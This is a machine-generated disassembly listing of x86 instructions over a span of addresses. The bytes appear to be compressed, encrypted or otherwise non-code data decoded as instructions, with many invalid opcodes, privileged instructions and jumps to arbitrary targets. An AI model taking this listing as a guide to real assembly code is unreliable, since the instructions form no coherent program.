  409218:	adc    DWORD PTR [edx+0x66],eax
  40921b:	pop    esp
  40921c:	mov    ?,WORD PTR [eax+0x7e92e93]
  409222:	or     DWORD PTR [ecx-0x29],esp
  409225:	xchg   dx,ax
  409227:	test   BYTE PTR [ebx+0x1cbd11af],cl
  40922d:	inc    ecx
  40922e:	push   ebp
  40922f:	dec    ebp
  409230:	dec    esi
  409231:	call   0xe83fea15
  409236:	push   0xffffffd5
  409238:	mov    ah,0x54
  40923a:	call   0x8d73:0x436c14e4
  409241:	adc    DWORD PTR [ecx-0x32],0x26
  409245:	ss (bad) 
  409247:	loope  0x409238
  409249:	cmp    DWORD PTR [esi-0x35],esi
  40924c:	(bad)  
  40924d:	int3   
  40924e:	int3   
  40924f:	adc    BYTE PTR [edi-0x5a],dh
  409252:	(bad)  
  409253:	out    dx,al
  409254:	dec    al
  409256:	aad    0x44
  409258:	pop    ds
  409259:	cmp    DWORD PTR [ebx+0x40],esi
  40925c:	int    0x44
  40925e:	or     ebx,DWORD PTR [ecx-0x7e]
  409261:	push   edi
  409262:	inc    DWORD PTR [ecx]
  409264:	nop
  409265:	push   ebx
  409266:	mov    cl,0x4e
  409268:	in     eax,dx
  409269:	pop    ss
  40926a:	les    esp,FWORD PTR [esi]
  40926c:	push   edx
  40926d:	fwait
  40926e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40926f:	xlat   BYTE PTR ds:[ebx]
  409270:	xor    edx,ebx
  409272:	push   esi
  409273:	dec    eax
  409274:	sti    
  409275:	rcl    BYTE PTR [edx-0x73],1
  409278:	es cmp eax,0xf6838cc2
  40927e:	imul   ebx,DWORD PTR [edx+0x19],0xfffffff2
  409282:	inc    edi
  409283:	sub    al,0xe0
  409285:	jp     0x40921b
  409287:	mov    DWORD PTR [ebp+0x26],ebx
  40928a:	sbb    dh,ah
  40928c:	scas   al,BYTE PTR es:[edi]
  40928d:	fsubr  DWORD PTR [ebx-0x55b5cbc9]
  409293:	mov    cs,WORD PTR [esp+edi*4+0x5]
  409297:	mov    ecx,0xccedda51
  40929c:	fild   WORD PTR [ebp-0x489a2a75]
  4092a2:	dec    ebp
  4092a3:	xor    BYTE PTR [edi-0x5a],ah
  4092a6:	out    0xe3,al
  4092a8:	cs xor ah,cl
  4092ab:	sub    esi,ecx
  4092ad:	and    eax,0x43b307bd
  4092b2:	xchg   edi,eax
  4092b3:	cmp    eax,0xc295ac0
  4092b8:	mov    edx,0xfc9ad303
  4092bd:	ins    BYTE PTR es:[edi],dx
  4092be:	stos   DWORD PTR es:[edi],eax
  4092bf:	fild   QWORD PTR [ebx-0x4aadf928]
  4092c5:	adc    ebx,esi
  4092c7:	stos   BYTE PTR es:[edi],al
  4092c8:	xchg   esp,eax
  4092c9:	mov    dh,bl
  4092cb:	(bad)  
  4092cc:	inc    di
  4092ce:	dec    BYTE PTR [edi]
  4092d0:	push   es
  4092d1:	sbb    ebp,DWORD PTR [ebp-0x65]
  4092d4:	cmp    cl,BYTE PTR [ecx+ebp*8]
  4092d7:	out    0x49,al
  4092d9:	out    0xf1,al
  4092db:	sub    al,0xcf
  4092dd:	dec    edi
  4092de:	jbe    0x409336
  4092e0:	adc    ch,BYTE PTR ds:0x4411513a
  4092e6:	in     al,0x72
  4092e8:	push   ds
  4092e9:	add    eax,0xb9ebc2d1
  4092ee:	call   FWORD PTR [edi-0x28]
  4092f1:	mov    bh,0x94
  4092f3:	or     bl,dl
  4092f5:	adc    edi,DWORD PTR [eax-0x2e]
  4092f8:	cmp    BYTE PTR [eax],ch
  4092fa:	data16 xor ah,bh
  4092fd:	nop
  4092fe:	push   ebx
  4092ff:	fs xchg ebp,eax
  409301:	arpl   WORD PTR [ecx+0x2b8bd211],dx
  409307:	fs mov cr1,esp
  40930b:	leave  
  40930c:	addr16 add eax,0xcc3b543
  409312:	test   eax,0x4054d444
  409317:	lea    ecx,[esi]
  409319:	leave  
  40931a:	ins    DWORD PTR es:[edi],dx
  40931b:	test   eax,0x5e572488
  409320:	xlat   BYTE PTR ds:[ebx]
  409321:	push   edi
  409322:	stos   BYTE PTR es:[edi],al
  409323:	dec    esi
  409324:	dec    edx
  409325:	mov    ecx,0xf2b963f2
  40932a:	lahf   
  40932b:	push   0x9673d43d
  409330:	sbb    al,0x9a
  409332:	and    DWORD PTR [edx-0x61],ebp
  409335:	loopne 0x4092f9
  409337:	push   ecx
  409338:	push   es
  409339:	scas   eax,DWORD PTR es:[edi]
  40933a:	xchg   edx,eax
  40933b:	in     eax,dx
  40933c:	fld    QWORD PTR [ecx-0x33]
  40933f:	stos   DWORD PTR es:[edi],eax
  409340:	shl    ecx,cl
  409342:	cmc    
  409343:	inc    edx
  409344:	push   0x93186f08
  409349:	das    
  40934a:	mov    cs,WORD PTR [esi]
  40934c:	jae    0x4092e8
  40934e:	fiadd  DWORD PTR [ecx+0x33]
  409351:	cdq    
  409352:	sahf   
  409353:	inc    ax
  409355:	outs   dx,DWORD PTR ds:[esi]
  409356:	popa   
  409357:	sub    eax,0xeec183f8
  40935c:	ins    DWORD PTR es:[edi],dx
  40935d:	xor    eax,0x84b77f58
  409362:	pop    ecx
  409363:	ret    0x79bb
  409366:	(bad)  
  409367:	mov    cs,esi
  409369:	inc    eax
  40936a:	inc    ebp
  40936b:	sbb    ch,ch
  40936d:	jecxz  0x4093b7
  40936f:	push   0x5c
  409371:	cld    
  409372:	cs leave 
  409374:	fcmovbe st,st(0)
  409376:	dec    esi
  409377:	test   DWORD PTR [eax+0x56],ebp
  40937a:	les    edx,FWORD PTR [ecx-0x1c]
  40937d:	xor    dl,BYTE PTR [edx+0x14db4be8]
  409383:	xor    al,0x79
  409385:	adc    eax,0x86a5dca4
  40938a:	jo     0x409377
  40938c:	ror    BYTE PTR [ebx-0x7ff23cdc],0x48
  409393:	xchg   esp,eax
  409394:	sub    al,0x4a
  409396:	cwde   
  409397:	sahf   
  409398:	dec    esp
  409399:	sbb    BYTE PTR ds:0xe8945ef6,cl
  40939f:	cld    
  4093a0:	lock pop ds
  4093a2:	adc    DWORD PTR [ecx],edx
  4093a4:	call   0x893c:0x9843ed33
  4093ab:	sbb    DWORD PTR [edi-0x101289cd],edi
  4093b1:	xchg   esi,eax
  4093b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4093b3:	jl     0x40941a
  4093b5:	pop    edx
  4093b6:	adc    BYTE PTR [ebp+0x281e8190],0x77
  4093bd:	pop    esp
  4093be:	cmp    DWORD PTR [edi],ebp
  4093c0:	dec    ecx
  4093c1:	mov    al,0x5e
  4093c3:	test   al,0xb7
  4093c5:	pop    ds
  4093c6:	es loop 0x409350
  4093c9:	into   
  4093ca:	add    DWORD PTR [edx],0xffffffac
  4093cd:	add    al,0x1d
  4093cf:	cmp    ebp,DWORD PTR [esi-0x7d0f5a68]
  4093d5:	stos   DWORD PTR es:[edi],eax
  4093d6:	outs   dx,BYTE PTR ds:[esi]
  4093d7:	packsswb mm3,QWORD PTR [edx+0x46381614]
  4093de:	arpl   WORD PTR [edx+0x79ad5df4],sp
  4093e4:	arpl   WORD PTR [esi+0x5],ax
  4093e7:	(bad)  
  4093e8:	push   ecx
  4093e9:	loopne 0x409431
  4093eb:	mov    WORD PTR [edi],gs
  4093ed:	adc    bh,bl
  4093ef:	hlt    
  4093f0:	enter  0xa6b3,0xc2
  4093f4:	jg     0x409450
  4093f6:	cld    
  4093f7:	inc    esp
  4093f8:	jl     0x409386
  4093fa:	mov    ebx,0x2f2ddbfa
  4093ff:	and    ch,BYTE PTR [eax]
  409401:	std    
  409402:	sub    esp,DWORD PTR [ebp-0x36]
  409405:	das    
  409406:	mov    esp,0x1845e88a
  40940b:	jo     0x4093a0
  40940d:	test   eax,0xc211d6fd
  409412:	adc    eax,edi
  409414:	fild   DWORD PTR [esi+0x72]
  409417:	fs xchg esp,eax
  409419:	es ja  0x409495
  40941c:	mov    ecx,0xd2afe513
  409421:	cwde   
  409422:	ss repz and eax,0xa7800f25
  409429:	add    dl,0xc6
  40942c:	jne    0x40941f
  40942e:	mov    al,0xf3
  409430:	test   DWORD PTR [ebx],edx
  409432:	mov    ds:0xf0f2f7fd,al
  409437:	push   cs
  409438:	cmp    eax,0x35cf2592
  40943d:	(bad)  
  40943e:	mov    al,bl
  409440:	repz and al,0x7e
  409443:	push   edi
  409444:	push   edi
  409445:	or     ebx,DWORD PTR [edi]
  409447:	dec    esp
  409448:	jp     0x4093ed
  40944a:	jnp    0x40945a
  40944c:	mov    bh,0xa9
  40944e:	dec    edi
  40944f:	or     eax,0xf38b051
  409454:	ret    0x2acd
  409457:	inc    esi
  409458:	or     BYTE PTR [eax],bh
  40945a:	lahf   
  40945b:	jb     0x4094b0
  40945d:	ret    0x5238
  409460:	neg    BYTE PTR [edx]
  409462:	es std 
  409464:	jo     0x4093f7
  409466:	cdq    
  409467:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409468:	jmp    0x409431
  40946a:	add    ecx,eax
  40946c:	lock xor BYTE PTR [edx],0xed
  409470:	retf   
  409471:	sti    
  409472:	bound  edx,QWORD PTR [ecx-0x26b5a391]
  409478:	dec    ebp
  409479:	dec    ecx
  40947a:	(bad)
  40947e:	pop    ebx
  40947f:	sar    DWORD PTR [eax+0x1bf6aa06],0x5d
  409486:	ja     0x40948a
  409488:	loope  0x409460
  40948a:	mov    edi,0x389120e8
  40948f:	movzx  esi,BYTE PTR [ecx+0x2f646c47]
  409496:	xor    al,0x95
  409498:	push   ebx
  409499:	stos   BYTE PTR es:[edi],al
  40949a:	push   edx
  40949b:	das    
  40949c:	sub    eax,0x863ed6e4
  4094a1:	jno    0x409495
  4094a3:	test   BYTE PTR [ecx-0x92c5195],ah
  4094a9:	test   al,0x3e
  4094ab:	push   esp
  4094ac:	cdq    
  4094ad:	dec    edi
  4094ae:	xor    BYTE PTR [eax+ecx*2+0x9],dl
  4094b2:	gs mov cs,ecx
  4094b5:	gs xchg ebp,eax
  4094b7:	xchg   edi,eax
  4094b8:	sub    al,0xdb
  4094ba:	mov    bl,0x60
  4094bc:	jl     0x409508
  4094be:	(bad)  
  4094bf:	fnstcw WORD PTR [ebx]
  4094c1:	adc    eax,0x85582d14
  4094c6:	les    edx,FWORD PTR es:[eax-0xdefee99]
  4094cd:	mov    ebx,edx
  4094cf:	lea    ecx,[edi+eiz*4+0x37b5e437]
  4094d6:	and    BYTE PTR [ecx-0x3b],ah
  4094d9:	sbb    eax,0xdd4b3454
  4094de:	xchg   edx,eax
  4094df:	push   es
  4094e0:	sbb    bh,BYTE PTR [edi-0x17]
  4094e3:	push   edx
  4094e4:	sub    DWORD PTR [edx],ebp
  4094e6:	sar    DWORD PTR [edx+ebp*1-0x1f8fa360],0x85
  4094ee:	loope  0x409505
  4094f0:	mov    ch,0xba
  4094f2:	bound  edx,QWORD PTR [ecx+esi*2+0x7c]
  4094f6:	pop    ds
  4094f7:	cmp    al,0xa4
  4094f9:	jo     0x40954d
  4094fb:	or     edi,DWORD PTR [ebp-0x79]
  4094fe:	pop    esp
  4094ff:	xchg   ecx,eax
  409500:	or     al,0x90
  409502:	inc    ebx
  409503:	mov    ch,0x6e
  409505:	xchg   edx,eax
  409506:	dec    esp
  409507:	mov    esi,0xa57f6146
  40950c:	inc    esp
  40950d:	mov    al,ds:0x3ff18d2f
  409512:	pop    ss
  409513:	dec    esp
  409514:	test   al,0x18
  409516:	adc    BYTE PTR [edi-0x19138aa9],ch
  40951c:	setns  dh
  40951f:	dec    ebx
  409520:	mov    ebp,0x863d620f
  409525:	jp     0x4094c8
  409527:	mov    esi,0x8d4e30f3
  40952c:	sub    DWORD PTR [esi],edx
  40952e:	add    eax,0x4cca8d23
  409533:	push   esp
  409534:	jmp    0x88762e6
  409539:	ins    BYTE PTR es:[edi],dx
  40953a:	mov    edi,0xfb35659a
  40953f:	mov    eax,ds:0x629cafd
  409544:	les    esp,FWORD PTR [edi-0x53]
  409547:	sahf   
  409548:	ret    0x8555
  40954b:	call   0x78cec21b
  409550:	and    al,0x41
  409552:	dec    edx
  409553:	loope  0x40955a
  409555:	jl     0x4095d0
  409557:	out    dx,eax
  409558:	push   ebp
  409559:	nop
  40955a:	pusha  
  40955b:	and    eax,0x8fbf3230
  409560:	push   ecx
  409561:	aad    0xbd
  409563:	mov    eax,0xb4be62c0
  409568:	outs   dx,BYTE PTR ds:[esi]
  409569:	jle    0x4094f1
  40956b:	mov    bh,0xbf
  40956d:	test   BYTE PTR [eax-0x3b826711],al
  409573:	inc    ebp
  409574:	das    
  409575:	rcr    DWORD PTR [ecx+0x47e2ea2a],1
  40957b:	or     DWORD PTR [eax-0x70],ebx
  40957e:	shl    bh,0x60
  409581:	mov    ds:0x85cf9aa8,al
  409587:	icebp  
  409588:	lods   al,BYTE PTR ds:[esi]
  409589:	jmp    0x4095cd
  40958b:	fisttp WORD PTR [edx+0x66]
  40958e:	adc    eax,0x789fc12c
  409593:	retf   
  409594:	jmp    0x40960c
  409596:	sub    al,0x26
  409598:	adc    esp,DWORD PTR [edx+edi*8]
  40959b:	mov    dl,0x73
  40959d:	xchg   ecx,eax
  40959e:	push   ss
  40959f:	leave  
  4095a0:	dec    esp
  4095a1:	jns    0x409586
  4095a3:	xchg   dh,ah
  4095a5:	lds    eax,FWORD PTR [esi]
  4095a7:	adc    ecx,DWORD PTR [ebx+0x55]
  4095aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4095ab:	fistp  WORD PTR ds:0x2166dcbd
  4095b1:	mov    al,0xf8
  4095b3:	fs pop esp
  4095b5:	test   BYTE PTR [ebp+0x585085e1],ah
  4095bb:	adc    al,0xb1
  4095bd:	test   eax,0xa32eb7c
  4095c2:	or     eax,0x478f0145
  4095c7:	sti    
  4095c8:	(bad)  
  4095c9:	push   edi
  4095ca:	out    dx,eax
  4095cb:	push   cs
  4095cc:	pusha  
  4095cd:	pop    ecx
  4095ce:	ins    BYTE PTR es:[edi],dx
  4095cf:	dec    ebp
  4095d0:	std    
  4095d1:	sbb    al,0x75
  4095d3:	push   esi
  4095d4:	lds    ebp,FWORD PTR [edi]
  4095d6:	nop
  4095d7:	mov    eax,ds:0x5601374b
  4095dc:	xchg   ebx,eax
  4095dd:	(bad)  
  4095de:	sbb    ch,cl
  4095e0:	imul   edi,ebp,0xffffffa1
  4095e3:	xchg   BYTE PTR [edi],dh
  4095e5:	xor    eax,0x2f2fef9f
  4095ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4095eb:	out    0x28,eax
  4095ed:	push   esi
  4095ee:	lods   eax,DWORD PTR ds:[esi]
  4095ef:	(bad)  
  4095f0:	icebp  
  4095f1:	or     al,0xa8
  4095f3:	jae    0x409653
  4095f5:	inc    esp
  4095f6:	inc    edx
  4095f7:	loopne 0x409658
  4095f9:	sub    esi,DWORD PTR [edx]
  4095fb:	in     al,dx
  4095fc:	daa    
  4095fd:	pop    eax
  4095fe:	fisubr DWORD PTR [esi]
  409600:	and    DWORD PTR [ebx+0xb],0x76
  409604:	pusha  
  409605:	outs   dx,DWORD PTR ds:[esi]
  409606:	sbb    DWORD PTR [ecx-0x1b],esi
  409609:	mov    edi,ss
  40960b:	pop    edi
  40960c:	call   0x43082c08
  409611:	add    eax,0x283b0b26
  409616:	mov    eax,ds:0xf397f149
  40961b:	es push edx
  40961d:	mov    BYTE PTR [edi+eiz*1-0x5f781e35],bl
  409624:	dec    esi
  409625:	jae    0x40968d
  409627:	push   esi
  409628:	jne    0x409663
  40962a:	sbb    edx,DWORD PTR [eax+0x57]
  40962d:	into   
  40962e:	loopne 0x409696
  409630:	adc    dl,BYTE PTR [ebx+edx*4]
  409633:	inc    edi
  409634:	mov    ch,0x86
  409636:	mov    bl,0x1
  409638:	mov    BYTE PTR [eax-0x6b],0x52
  40963c:	fdivr  DWORD PTR es:[esi+ebx*2-0x48e8b398]
  409644:	sbb    al,0x94
  409646:	mov    BYTE PTR [edi+0x5a],bh
  409649:	add    BYTE PTR [edi],ch
  40964b:	inc    eax
  40964c:	ret    0x1aa8
  40964f:	mov    edx,0x871c87fb
  409654:	shl    DWORD PTR [edi],0x9c
  409657:	jl     0x409674
  409659:	int    0x29
  40965b:	clc    
  40965c:	jbe    0x4095ed
  40965e:	out    0x9b,eax
  409660:	inc    eax
  409661:	fld    st(0)
  409663:	mov    cl,0x8f
  409665:	icebp  
  409666:	and    ecx,DWORD PTR [eax]
  409668:	pop    esi
  409669:	xchg   ecx,eax
  40966a:	in     eax,0xb6
  40966c:	dec    esi
  40966d:	or     eax,0x598ec747
  409672:	aam    0x87
  409674:	arpl   WORD PTR [edx],di
  409676:	es pop edx
  409678:	xchg   ebx,ebp
  40967a:	xchg   ecx,eax
  40967b:	aam    0xb9
  40967d:	outs   dx,DWORD PTR ds:[esi]
  40967e:	je     0x409620
  409680:	sub    eax,0x9b609de2
  409685:	shl    BYTE PTR [ebx+0x1d],0x6c
  409689:	mov    dh,0x13
  40968b:	sub    al,0x2d
  40968d:	mov    cl,BYTE PTR [esi]
  40968f:	fdivrp st(7),st
  409691:	repz sahf 
  409693:	cli    
  409694:	sub    BYTE PTR [ebx-0x60581ead],0xbe
  40969b:	mov    ecx,0x3e14e3bc
  4096a0:	jmp    0x4096f1
  4096a2:	adc    BYTE PTR [ecx+0xb5de2e1],cl
  4096a8:	ror    BYTE PTR [edx],0xa7
  4096ab:	mov    bl,0x1b
  4096ad:	push   eax
  4096ae:	jp     0x409661
  4096b0:	rol    BYTE PTR [edx+0x5d],0xe7
  4096b4:	(bad)  
  4096b6:	mov    ds:0xaae1e0ba,al
  4096bb:	lods   eax,DWORD PTR ds:[esi]
  4096bc:	pop    eax
  4096bd:	fwait
  4096be:	pop    ds
  4096bf:	outs   dx,DWORD PTR ds:[esi]
  4096c0:	and    BYTE PTR [esi+0x74],ch
  4096c3:	rcl    BYTE PTR [esi-0x1a334224],0x52
  4096ca:	scas   eax,DWORD PTR es:[edi]
  4096cb:	inc    edx
  4096cc:	jmp    0x35dd75c9
  4096d1:	lds    ebx,FWORD PTR [eax+esi*1]
  4096d4:	lock ds aas 
  4096d7:	push   esi
  4096d8:	aas    
  4096d9:	scas   eax,DWORD PTR es:[edi]
  4096da:	lahf   
  4096db:	inc    ecx
  4096dc:	sbb    dl,ch
  4096de:	(bad)  
  4096df:	sub    al,0xaa
  4096e1:	push   ecx
  4096e2:	mov    edi,0xd00499c3
  4096e7:	pop    edx
  4096e8:	mov    ebx,0xb90c0cd4
  4096ed:	xchg   ebx,eax
  4096ee:	and    ah,BYTE PTR [eax]
  4096f0:	sub    DWORD PTR [ebp+ebx*8+0x49],ebp
  4096f4:	xor    bl,BYTE PTR [esi-0x54]
  4096f7:	ins    BYTE PTR es:[edi],dx
  4096f8:	xor    eax,0x7239d160
  4096fd:	add    BYTE PTR [eax+ebx*4],bl
  409700:	dec    eax
  409701:	and    ecx,edi
  409703:	adc    DWORD PTR [esi],0xffffffa2
  409706:	add    DWORD PTR [esi],eax
  409708:	pop    edi
  409709:	inc    edx
  40970a:	push   ds
  40970b:	cli    
  40970c:	jns    0x4096ee
  40970e:	mov    esp,0x62bb9af
  409713:	out    dx,eax
  409714:	call   0xbcf7:0x2bb89d9f
  40971b:	iret   
  40971c:	or     cl,BYTE PTR [eax+0x719861fe]
  409722:	cmc    
  409723:	jl     0x409720
  409725:	outs   dx,BYTE PTR ds:[esi]
  409726:	scas   eax,DWORD PTR es:[edi]
  409727:	mov    eax,0xb24deadd
  40972c:	jb     0x40976f
  40972e:	jmp    0xd019:0x3e2d4e59
  409735:	jb     0x40975d
  409737:	daa    
  409738:	xlat   BYTE PTR ds:[ebx]
  409739:	add    DWORD PTR [esi+0x3],ebp
  40973c:	pop    edi
  40973d:	daa    
  40973e:	cld    
  40973f:	jg     0x4096ef
  409741:	repz repz out 0xec,eax
  409745:	ss ds jecxz 0x4096fe
  409749:	push   es
  40974a:	mov    bh,bh
  40974c:	dec    edx
  40974d:	or     DWORD PTR [ecx+0x55],0x11
  409751:	pusha  
  409752:	push   ebp
  409753:	lods   eax,DWORD PTR fs:[esi]
  409755:	mov    dh,0xfc
  409757:	icebp  
  409758:	sub    eax,0x5df05ada
  40975d:	aam    0x64
  40975f:	loop   0x409758
  409761:	mov    ebx,0x1d97bdbd
  409766:	ja     0x4097b4
  409768:	push   ebx
  409769:	or     ebx,edx
  40976b:	cmp    esp,DWORD PTR [ecx-0x74664e63]
  409771:	loopne 0x40978f
  409773:	(bad)  
  409774:	xor    cl,BYTE PTR [edx]
  409776:	mov    ebp,es
  409778:	jge    0x4097a2
  40977a:	add    DWORD PTR [ebp+edi*4+0x639f95d],0xdd96fb66
  409785:	pop    es
  409786:	es fs es xchg esp,eax
  40978a:	sbb    BYTE PTR [ebx],0x7
  40978d:	pop    esp
  40978e:	mov    ah,ch
  409790:	pusha  
  409791:	sub    eax,0x59abf5f3
  409796:	iret   
  409797:	aad    0x9a
  409799:	icebp  
  40979a:	es daa 
  40979c:	xchg   edx,eax
  40979d:	adc    eax,0xd522c7b8
  4097a2:	dec    edx
  4097a3:	in     eax,0x48
  4097a5:	cmp    BYTE PTR [edx-0x2876c4dd],0xeb
  4097ac:	push   ebx
  4097ad:	sbb    DWORD PTR [ecx+0x17],esi
  4097b0:	push   ss
  4097b1:	out    dx,al
  4097b2:	sti    
  4097b3:	retf   0x6af4
  4097b6:	jno    0x409826
  4097b8:	cmp    BYTE PTR [edi],bh
  4097ba:	ds mov ch,0x59
  4097bd:	jl     0x4097ff
  4097bf:	jbe    0x4097d1
  4097c1:	in     eax,0xe6
  4097c3:	inc    esi
  4097c4:	cmp    eax,0x1f07d308
  4097c9:	xor    ch,cl
  4097cb:	stos   WORD PTR es:[edi],ax
  4097cd:	push   ebp
  4097ce:	push   eax
  4097cf:	mov    ch,0xda
  4097d1:	je     0x4097a1
  4097d3:	call   0x415c:0x9469fd75
  4097da:	and    BYTE PTR ds:0xc48009eb,al
  4097e0:	add    al,0x80
  4097e2:	lea    ecx,[esp+0x50b7c25c]
  4097e9:	cwde   
  4097ea:	xor    BYTE PTR [ecx],ah
  4097ec:	push   ecx
  4097ed:	cmp    al,BYTE PTR [esi-0x49]
  4097f0:	inc    edi
  4097f1:	cld    
  4097f2:	jmp    0x3fbe13c2
  4097f7:	into   
  4097f8:	retf   
  4097f9:	cli    
  4097fa:	inc    eax
  4097fb:	push   ebp
  4097fc:	sahf   
  4097fd:	dec    eax
  4097fe:	sub    DWORD PTR [edi],edi
  409800:	test   BYTE PTR [ebp-0x3a2309cd],bl
  409806:	and    ebp,esi
  409808:	add    al,0xaf
  40980a:	test   eax,0x82673962
  40980f:	fisub  WORD PTR [ebp-0x463346c5]
  409815:	cmp    ebx,DWORD PTR [esi]
  409817:	test   DWORD PTR [ebp+0x26ed2bfc],ecx
  40981d:	repnz pop esi
  40981f:	je     0x409846
  409821:	adc    eax,0x9b8696b0
  409826:	mov    dh,BYTE PTR [ecx-0x5cee4cb3]
  40982c:	jno    0x4097f1
  40982e:	adc    al,BYTE PTR [ebx+ebp*4-0x3]
  409832:	lods   eax,DWORD PTR ds:[esi]
  409833:	lds    edi,FWORD PTR [esi+0x1683bf5f]
  409839:	inc    ebp
  40983a:	xchg   DWORD PTR [esi-0x3c89ccd6],esi
  409840:	aas    
  409841:	cdq    
  409842:	pop    ebp
  409843:	pop    edx
  409844:	out    dx,al
  409845:	repnz pop ecx
  409847:	pop    esp
  409848:	cmp    DWORD PTR [edx-0x6e95daf7],ecx
  40984e:	mov    ch,0xe2
  409850:	jns    0x40985b
  409852:	mov    bh,BYTE PTR [eax]
  409854:	push   esi
  409855:	(bad)  
  409856:	xchg   ecx,eax
  409857:	and    eax,0xa4edea37
  40985c:	mov    bh,BYTE PTR [eiz*1-0x77154993]
  409863:	out    0x8e,al
  409865:	repz bound ebp,QWORD PTR [ebx+0x68e19b14]
  40986c:	jmp    0x440a:0xeac57e02
  409873:	xchg   BYTE PTR [edx],ch
  409875:	popf   
  409876:	mov    al,ds:0xc39f5112
  40987b:	dec    ebp
  40987c:	push   ds
  40987d:	cmp    bh,BYTE PTR [esi]
  40987f:	mov    ebx,0xbc87be9a
  409884:	fld    DWORD PTR [ebx+0x6b]
  409887:	pop    ebx
  409888:	lods   al,BYTE PTR ds:[esi]
  409889:	pop    ebp
  40988a:	jmp    0x41e0:0xda491152
  409891:	aaa    
  409892:	repnz fsub DWORD PTR ds:0x914142ea
  409899:	and    BYTE PTR ds:0x7148f94,0x44
  4098a0:	add    BYTE PTR [eax],cl
  4098a2:	pop    edx
  4098a3:	cmp    ebp,DWORD PTR [edx+0x75]
  4098a6:	push   eax
  4098a7:	popa   
  4098a8:	scas   al,BYTE PTR es:[edi]
  4098a9:	retf   
  4098aa:	ret    
  4098ab:	loope  0x40982f
  4098ad:	scas   al,BYTE PTR es:[edi]
  4098ae:	push   ebx
  4098af:	pop    edx
  4098b0:	ret    
  4098b1:	inc    ebp
  4098b2:	jl     0x4098f2
  4098b4:	jmp    0x40984f
  4098b6:	cmp    DWORD PTR [edx],0x51
  4098b9:	call   0xc529804d
  4098be:	xor    eax,0x42402635
  4098c3:	push   ebp
  4098c4:	xor    ebx,DWORD PTR [ebp-0x4e]
  4098c7:	push   esi
  4098c8:	gs mov esp,0x1b3966ec
  4098ce:	jmp    0x409866
  4098d0:	inc    ecx
  4098d1:	(bad)  
  4098d2:	imul   ah
  4098d4:	xchg   ecx,eax
  4098d5:	and    edx,edx
  4098d7:	inc    ebx
  4098d8:	push   0x9f6113d6
  4098dd:	and    edi,esi
  4098df:	dec    ebp
  4098e0:	inc    ebx
  4098e1:	jecxz  0x4098bd
  4098e3:	or     al,bh
  4098e5:	and    eax,0x861849a0
  4098ea:	inc    eax
  4098eb:	dec    DWORD PTR [edi+0x2]
  4098ee:	rcr    ch,0xa9
  4098f1:	mov    esi,0xfac7939e
  4098f6:	je     0x409945
  4098f8:	(bad)  
  4098fb:	dec    eax
  4098fc:	mov    ebx,0xd5e89775
  409901:	mov    ah,0x2
  409903:	imul   eax,DWORD PTR [edx],0x21
  409906:	daa    
  409907:	push   ebp
  409908:	pusha  
  409909:	mov    esi,0x8cc80115
  40990e:	lock js 0x409941
  409911:	add    DWORD PTR [edx-0x922234e],edx
  409917:	ss xchg ebx,eax
  409919:	in     al,dx
  40991a:	aad    0xe2
  40991c:	inc    eax
  40991d:	pop    esi
  40991e:	mov    ah,0xd8
  409920:	xchg   ecx,eax
  409921:	lods   eax,DWORD PTR ds:[esi]
  409922:	mov    esp,0x57ad2f55
  409927:	or     DWORD PTR [edx],ecx
  409929:	and    DWORD PTR [eax+0x51fd017f],0x9b4d7539
  409933:	adc    eax,0x540c9c0a
  409938:	stc    
  409939:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40993a:	and    DWORD PTR [edi+ebx*8-0x6c4aa87],edx
  409941:	inc    ecx
  409942:	push   esi
  409943:	pop    esi
  409944:	shl    BYTE PTR [edi+0x4662ad10],0x4c
  40994b:	(bad)  
  40994c:	cmp    cl,BYTE PTR [eax+0x109b1350]
  409952:	cmp    BYTE PTR [ecx+edx*1-0x1faf8cbe],0xb1
  40995a:	out    dx,eax
  40995b:	std    
  40995c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40995d:	cmp    esi,DWORD PTR [ebp+0x1f]
  409960:	pop    esp
  409961:	ins    BYTE PTR es:[edi],dx
  409962:	or     eax,0x8f1b10e1
  409967:	loop   0x409997
  409969:	out    0x71,al
  40996b:	xchg   edx,eax
  40996c:	add    cl,BYTE PTR ds:0x55d7a870
  409972:	inc    edi
  409973:	mov    bl,bh
  409975:	data16 je 0x40999f
  409978:	add    eax,DWORD PTR [edx]
  40997a:	in     eax,dx
  40997b:	mov    bl,0xd6
  40997d:	xchg   BYTE PTR [eax-0x73],cl
  409980:	dec    edi
  409981:	dec    esi
  409982:	jecxz  0x409921
  409984:	call   0xe8de:0xb72e388b
  40998b:	std    
  40998c:	inc    esi
  40998d:	dec    ebx
  40998e:	in     al,0x55
  409990:	or     al,0x75
  409992:	dec    edx
  409993:	ror    ebx,0xb4
  409996:	jp     0x4099dc
  409998:	mov    bl,dl
  40999a:	mov    fs,edi
  40999c:	xor    esp,0xc8f7ab58
  4099a2:	ret    0xddc3
  4099a5:	cmp    DWORD PTR [esi],0xffffffb8
  4099a8:	es inc esp
  4099aa:	retf   0x875
  4099ad:	xchg   DWORD PTR [ebp-0x2a58bc59],edx
  4099b3:	retf   
  4099b4:	push   ss
  4099b5:	sbb    BYTE PTR [eax-0x3e17b1f8],0x10
  4099bc:	pop    ebx
  4099bd:	xchg   esp,eax
  4099be:	repz push 0xffffff88
  4099c1:	add    DWORD PTR [ebx-0x61],ebx
  4099c4:	xlat   BYTE PTR ds:[ebx]
  4099c5:	jge    0x409967
  4099c7:	or     al,0xa1
  4099c9:	nop
  4099ca:	mov    ds:0x2cea359e,eax
  4099cf:	push   ebx
  4099d0:	pusha  
  4099d1:	idiv   DWORD PTR [ebx]
  4099d3:	mov    dl,0x7d
  4099d5:	pop    edx
  4099d6:	mov    ah,0xce
  4099d8:	retf   0xe4cf
  4099db:	mov    ds:0x72aba04b,al
  4099e0:	pop    esi
  4099e1:	mov    BYTE PTR [edx+0x64d9adc6],ah
  4099e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4099e8:	imul   ebx,DWORD PTR [ebp+0x1f],0xa703cf12
  4099ef:	or     eax,0x9b4d6f23
  4099f4:	xchg   ebp,eax
  4099f5:	mov    dl,0x3f
  4099f7:	scas   al,BYTE PTR es:[edi]
  4099f8:	push   0x29
  4099fa:	and    eax,0xf0772035
  4099ff:	jno    0x409998
